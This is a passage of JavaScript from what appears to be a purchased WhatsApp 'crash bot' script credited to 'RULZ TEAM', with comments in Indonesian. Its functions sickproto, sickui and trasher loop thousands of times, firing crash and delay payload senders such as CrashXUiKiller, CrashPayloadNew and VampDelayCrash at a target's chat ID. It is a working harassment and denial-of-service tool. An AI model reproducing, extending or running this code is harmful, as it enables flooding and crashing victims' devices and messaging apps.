   await safeExec("XdelayTrash", () => XdelayTrash(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("LocaBetanew2", () => LocaBetanew2(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await delay(400);
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await delay(2000);
  }

  console.log(`Selesai DELAY ke ${jid} oleh ${sock.user.id}`);
}


//proto function
async function sickproto(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING PROTO ${jid}`));

  for (let i = 1; i <= 3900; i++) {
    if (!sock.user) break;

    console.log(chalk.red.bold(`PROTO SEND TO ${jid}`));

    await safeExec("protocol5", () => protocol5(sock, jid, true));
    await safeExec("protocol5", () => protocol5(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await delay(400);
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await safeExec("protocol5", () => protocol5(sock, jid, true));
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await delay(400);
    await safeExec("btnStatus", () => btnStatus(sock, jid, true));
    await safeExec("btnStatus", () => btnStatus(sock, jid, true));
    await safeExec("btnStatus", () => btnStatus(sock, jid, true));
    await delay(2000);
  }

  console.log(`Selesai PROTO ke ${jid} oleh ${sock.user.id}`);
}


//ui function
async function sickui(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING UI ${jid}`));

  for (let i = 1; i <= 3900; i++) {
    if (!sock.user) break;

    console.log(chalk.red.bold(`uisystem SENDING TO ${jid}`));
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await safeExec("BetaUI", () => BetaUI(sock, jid));
    await safeExec("CrashXUiKiller", () => CrashXUiKiller(sock, jid));
    await delay(200);
    await safeExec("CrashXUiKiller", () => CrashXUiKiller(sock, jid));
    await safeExec("systemUi", () => systemUi(sock, jid));
    await safeExec("CrashXUiKiller", () => CrashXUiKiller(sock, jid));
    await delay(400);
     await safeExec("NewsletterZap", () => NewsletterZap(sock, jid));
    await safeExec("systemUi", () => systemUi(sock, jid));
    await safeExec("NewsletterZap", () => NewsletterZap(sock, jid));
    await delay(400);
    await safeExec("BetaUI", () => BetaUI(sock, jid));
    await safeExec("systemUi", () => systemUi(sock, jid));
    await safeExec("VampDelayCrash", () => VampDelayCrash(sock, jid));
    await delay(2000);
  }

  console.log(`Selesai uisystem ke ${jid} oleh ${sock.user.id}`);
}

//trasher function
async function trasher(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING TRASHER ${jid}`));

  for (let i = 1; i <= 3900; i++) {
    if (!sock.user) break;

    console.log(chalk.red.bold(`TRASHER SENDING TO ${jid}`));
    await safeExec("CursorimgDoc", () => CursorimgDoc(sock, jid));
    await safeExec("BetaUI", () => BetaUI(sock, jid));
    await safeExec("CursorimgDoc", () => CursorimgDoc(sock, jid));
    await safeExec("CrashXUiKiller", () => CrashXUiKiller(sock, jid));
    await safeExec("StxCuiSh", () => StxCuiSh(sock, jid));
    await safeExec("CrashXUiKiller", () => CrashXUiKiller(sock, jid));
    await delay(400);
    await safeExec("CrashPayloadNew", () => CrashPayloadNew(sock, jid));
    await safeExec("CrashPayloadNew", () => CrashPayloadNew(sock, jid));
    await safeExec("CrashPayloadNew", () => CrashPayloadNew(sock, jid));
    await safeExec("crashUiV5", () => crashUiV5(sock, jid));
    await safeExec("StxCuiSh", () => StxCuiSh(sock, jid));
    await safeExec("crashUiV5", () => crashUiV5(sock, jid));
    await delay(400);
     await safeExec("splashpayment", () => splashpayment(sock, jid));
     await safeExec("BetaUI", () => BetaUI(sock, jid));
    await safeExec("splashpayment", () => splashpayment(sock, jid));
    await safeExec("NewsletterZap", () => NewsletterZap(sock, jid));
    await delay(400);
    await safeExec("VampDelayCrash", () => VampDelayCrash(sock, jid));
    await safeExec("VampDelayCrash", () => VampDelayCrash(sock, jid));
    await safeExec("VampDelayCrash", () => VampDelayCrash(sock, jid));
    await delay(2000);
  }

  console.log(`Selesai TRASHER ke ${jid} oleh ${sock.user.id}`);
}

// Utility untuk eksekusi aman !! JANGAN DI GANTI KALO GA NGERTI !!
async function safeExec(label, func) {
  try {
    await func();
  } catch (err) {
    console.error(`Error saat ${label}:`, err.message);
  }
}

// Delay helper !! JANGAN DI HAPUS !!
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

    console.clear();
    console.log(chalk.bold.red("\RULZ TEAM CORE"));
    console.log(chalk.bold.white("DEVELOPER: RULZ TEAM"));
    console.log(chalk.bold.white("VERSION: 1.3"));
    console.log(chalk.bold.white("ACCESS: ") + chalk.bold.green("YES"));
    console.log(chalk.bold.white("STATUS: ") + chalk.bold.green("ONLINE\n\n"));
    console.log(chalk.bold.yellow("THANKS FOR BUYING THIS SCRIPT TEAM RULZ"));